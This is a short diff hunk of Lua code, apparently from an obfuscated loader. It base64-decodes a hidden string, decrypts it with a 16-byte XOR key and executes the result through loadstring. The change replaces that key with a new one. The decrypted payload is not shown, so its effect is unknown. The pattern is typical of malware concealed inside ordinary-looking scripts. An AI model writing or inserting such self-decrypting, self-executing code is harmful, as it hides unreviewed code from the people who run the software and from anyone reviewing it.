@@ -12,7 +12,7 @@ for j=0,3 do local c=s:sub(i+j,i+j)n=n*64+((c=="=")and 0 or(b:find(c,1,true)-1))
 t[#t+1]=string.char(math.floor(n/65536))t[#t+1]=string.char(math.floor(n/256)%256)t[#t+1]=string.char(n%256)end
 local d=table.concat(t)
 if e>0 then d=d:sub(1,#d-e) end
-local k={45,28,247,202,171,157,67,16,30,242,15,23,79,56,89,129}
+local k={161,17,18,206,168,119,5,16,16,115,150,84,41,74,144,148}
 local o={}
 for i=1,#d do o[i]=string.char(bit32.bxor(d:byte(i),k[(i-1)%16+1])) end
 loadstring(table.concat(o))()
